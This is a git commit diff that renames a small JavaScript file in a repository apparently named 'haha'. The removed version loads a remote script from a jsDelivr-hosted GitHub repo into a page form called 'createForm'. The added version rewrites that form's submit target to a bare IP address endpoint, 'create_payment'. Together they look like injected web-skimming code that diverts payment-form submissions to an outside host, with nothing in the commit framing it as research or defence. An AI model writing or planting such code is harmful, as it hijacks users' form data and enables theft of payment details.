d84bb3ece1a0901d6ddccc3908d5522b8339174e
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-01 00:21:57 +0800

    Update and rename ha11.js to ha12.js

--- ha11.js
+++
@@ -1,7 +0,0 @@
-window.onload=function(){var scriptEle = document.createElement("script");
-     scriptEle.type = "text/javascript";
-     scriptEle.src = "https://cdn.jsdelivr.net/gh/xjjkong/haha@main/hei6.js";
-     var x = document.getElementById("createForm");
-     x.insertBefore(scriptEle, x.firstChild);
-     document.body.appendChild(scriptEle);
-}
---
+++ ha12.js
@@ -0,0 +1,3 @@
+window.onload=function(){
+     document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'
+}
